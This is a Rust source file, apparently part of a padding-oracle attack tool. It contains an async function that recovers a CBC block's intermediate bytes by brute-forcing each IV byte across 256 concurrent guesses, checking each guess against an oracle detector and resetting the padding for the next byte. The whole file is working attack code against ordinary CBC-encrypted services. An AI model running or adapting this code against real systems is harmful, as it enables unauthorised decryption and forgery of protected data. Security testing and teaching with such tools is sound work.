use std::sync::{Arc, atomic::{AtomicBool, Ordering}};

use tokio::{sync::{Mutex}, task::JoinSet};

use crate::{crypt::detector::{DETECT, Detector}, errors::DecryptError};

pub mod decrypt;
pub mod forge;
pub mod detector;

async fn calc_intermediate_vector<D: Detector + Send +Sync + 'static>(iv: &[u8], ct_block: &[u8], detector: Arc<D>) -> Result<Vec<u8>, DecryptError> {
    let mut iv = Vec::from(iv);
    let blk_size = iv.len();
    let intermediate_vector_shared = Arc::new(Mutex::new(vec![0u8; blk_size as usize]));
    let mut curr_padding = 1u8;
    let detector_shared = Arc::new(detector);
    for i in (0..blk_size).rev() {
        let mut futures_set = JoinSet::new();
        let canceled_shared = Arc::new(AtomicBool::new(false));
        for j in 0..=255 {
            let intermediate_vector = intermediate_vector_shared.clone();
            let mut iv_copy = iv.clone();
            let ct_block = ct_block.to_vec();
            let detector = detector_shared.clone();
            let canceled = canceled_shared.clone();
            futures_set.spawn(async move {
                iv_copy[i as usize] = j;
                if !canceled.load(Ordering::SeqCst) && let Ok(response) =
                    detector.check(&iv_copy.iter().chain(&ct_block).cloned().collect::<Vec<u8>>()).await
                {
                    // found a valid padding
                    if !canceled.load(Ordering::SeqCst) && response == DETECT::OUTLIER {
                        let zero_byte = j ^ curr_padding;
                        let mut intermediate_vector = intermediate_vector.lock().await;
                        intermediate_vector[i as usize] = zero_byte;
                        canceled.fetch_or(true, Ordering::SeqCst);
                    }
                }
            });
        }
        futures_set.join_all().await;
        if !canceled_shared.load(Ordering::SeqCst){
            return Err(DecryptError::CouldNotDecryptClassic("Could not find valid padding".to_string()));
        }
        // if we're not on the last byte then we need to set the cipher text
        // such that the decrypter will see a valid padding \x04\x04\x04... except
        // for the byte that we're working on.
        if i != 0 {
            for k in (blk_size - curr_padding as usize - 1)..blk_size {
                let zero = intermediate_vector_shared.clone().lock().await[k as usize];
                iv[k as usize] = zero ^ curr_padding + 1;
            }
        }
        curr_padding += 1;
    }
    return Ok(intermediate_vector_shared.clone().lock().await.to_vec());
}
